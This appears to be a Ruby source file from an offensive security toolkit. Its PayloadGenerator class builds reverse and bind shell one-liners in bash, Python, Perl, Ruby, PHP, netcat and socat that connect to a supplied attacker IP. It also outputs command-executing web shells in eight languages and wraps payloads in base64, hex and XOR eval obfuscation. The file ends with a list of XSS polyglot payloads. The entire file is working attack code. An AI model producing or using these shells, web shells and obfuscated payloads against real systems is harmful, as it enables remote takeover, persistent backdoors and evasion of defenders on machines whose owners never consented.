require 'base64'
require_relative '../utils/colorize'

class PayloadGenerator
  def self.generate_reverse_shell(ip, port, type = :bash)
    payloads = {
      bash: "bash -i >& /dev/tcp/#{ip}/#{port} 0>&1",
      python: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ip}\",#{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
      perl: "perl -e 'use Socket;$i=\"#{ip}\";$p=#{port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
      ruby: "ruby -rsocket -e 'f=TCPSocket.open(\"#{ip}\",#{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
      php: "php -r '$sock=fsockopen(\"#{ip}\",#{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
      nc: "nc -e /bin/sh #{ip} #{port}",
      socat: "socat TCP:#{ip}:#{port} EXEC:/bin/bash"
    }
    payloads[type] || payloads[:bash]
  end

  def self.generate_bind_shell(port, type = :bash)
    payloads = {
      bash: "bash -i >& /dev/tcp/0.0.0.0/#{port} 0>&1",
      python: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"\",#{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
      perl: "perl -e 'use Socket;$p=#{port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'",
      ruby: "ruby -rsocket -e 's=TCPServer.new(#{port});c=s.accept;IO.copy_stream(c,c);'",
      php: "php -r '$port=#{port};$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($sock,0,$port);socket_listen($sock,1);$conn=socket_accept($sock);while(true){$cmd=socket_read($conn,1024);if($cmd==\"exit\"){break;}exec($cmd,$output);socket_write($conn,implode(\"\\n\",$output));}'",
      nc: "nc -l -p #{port} -e /bin/sh",
      socat: "socat TCP-LISTEN:#{port},fork EXEC:/bin/bash"
    }
    payloads[type] || payloads[:bash]
  end

  def self.generate_web_shell(type = :php)
    shells = {
      php: '<?php system($_GET["cmd"]); ?>',
      jsp: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
      asp: '<% eval request("cmd") %>',
      aspx: '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]); %>',
      cgi: '#!/bin/bash\necho "Content-type: text/html"\necho ""\necho `$QUERY_STRING | sed "s/cmd=//"`',
      perl: '#!/usr/bin/perl\nuse CGI qw(:standard);\nprint header;\n$cmd=param("cmd");\nsystem($cmd);',
      python: '#!/usr/bin/env python\nimport cgi\nimport os\nprint("Content-Type: text/html\\n")\nform = cgi.FieldStorage()\ncmd = form.getvalue("cmd")\nos.system(cmd)',
      ruby: '#!/usr/bin/env ruby\nrequire "cgi"\ncgi = CGI.new\ncmd = cgi["cmd"]\nputs "Content-Type: text/html\\n"\nsystem(cmd)'
    }
    shells[type] || shells[:php]
  end

  def self.generate_obfuscated_payload(payload, type = :base64)
    case type
    when :base64
      "eval(base64_decode('#{Base64.strict_encode64(payload)}'))"
    when :hex
      hex = payload.unpack('H*').first
      "eval(pack('H*','#{hex}'))"
    when :url
      URI.encode_www_form_component(payload)
    when :unicode
      payload.codepoints.map { |c| "\\u#{c.to_s(16).rjust(4, '0')}" }.join
    when :rot13
      payload.tr('A-Za-z', 'N-ZA-Mn-za-m')
    when :xor
      key = rand(255)
      xored = payload.bytes.map { |b| (b ^ key).chr }.join
      "eval(xor_decode('#{Base64.strict_encode64(xored)}', #{key}))"
    else
      payload
    end
  end

  def self.generate_polyglot_payload
    [
      "GIF89a/*<svg/onload=alert(1)>*/=alert('XSS')//",
      "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
      "<script>/*'/*\"/*</script>/*'/*\"/*<script>alert(1)</script>",
      "';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "<body onload=alert(1)>",
      "<iframe src=javascript:alert(1)>",
      "<input autofocus onfocus=alert(1)>",
      "<select autofocus onfocus=alert(1)>",
      "<textarea autofocus onfocus=alert(1)>",
      "<keygen autofocus onfocus=alert(1)>",
      "<video><source onerror=alert(1)>",
      "<audio src=x onerror=alert(1)>",
      "<details open ontoggle=alert(1)>",
      "<marquee onstart=alert(1)>",
      "<object data=javascript:alert(1)>",
      "<embed src=javascript:alert(1)>",
      "<link rel=stylesheet href=javascript:alert(1)>",
      "<style>@import'javascript:alert(1)';</style>",
      "<style>body{-moz-binding:url(\"javascript:alert(1)\")}</style>",
      "<div style=background-image:url(javascript:alert(1))>",
      "<div style=width:expression(alert(1))>",
      "<table background=javascript:alert(1)>",
      "<isindex type=image src=1 onerror=alert(1)>",
      "<form><button formaction=javascript:alert(1)>",
      "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">"
    ]
  end
end

